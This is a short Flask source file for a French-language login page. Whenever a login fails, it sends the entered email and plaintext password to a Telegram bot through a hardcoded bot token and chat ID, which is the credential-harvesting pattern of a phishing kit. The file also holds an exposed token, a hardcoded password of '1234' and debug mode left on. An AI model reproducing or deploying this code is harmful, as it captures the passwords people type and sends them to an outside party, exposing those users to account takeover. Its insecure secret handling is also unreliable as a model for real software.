from flask import Flask, render_template, request, jsonify, redirect, url_for
import requests

app = Flask(__name__)

TOKEN = "8597749732:AAG6JLL8Ynix1I0KTtSVTQuGPZBY8rvIMlw"
CHAT_ID = "6821665941"

def envoyer_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    response = requests.post(url, data=data)
    print("TELEGRAM RESPONSE:", response.text)
    return response

@app.route('/', methods=['GET', 'POST'])
def home():
    print("METHOD:", request.method)
    error = None

    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')

        if not email or not password:
            return render_template("login.html", error=None)

        if email == "mariobd@boutik.fr" and password == "1234":
            # ✅ Notification tentative réussie
            envoyer_telegram(f"""
✅ <b>Connexion réussie</b>
📧 Email : {email}
""")
            return render_template("dashboard.html")
        else:
            # ❌ Notification tentative échouée
            envoyer_telegram(f"""
❌ <b>Tentative de connexion échouée</b>
📧 Email : {email}
🔑 Password : {password}
""")
            error = "Mot de passe incorrect"

    return render_template("login.html", error=error)

@app.route('/forgot-password')
def forgot_password():
    return "Page mot de passe oublié"

if __name__ == '__main__':
    app.run(debug=True)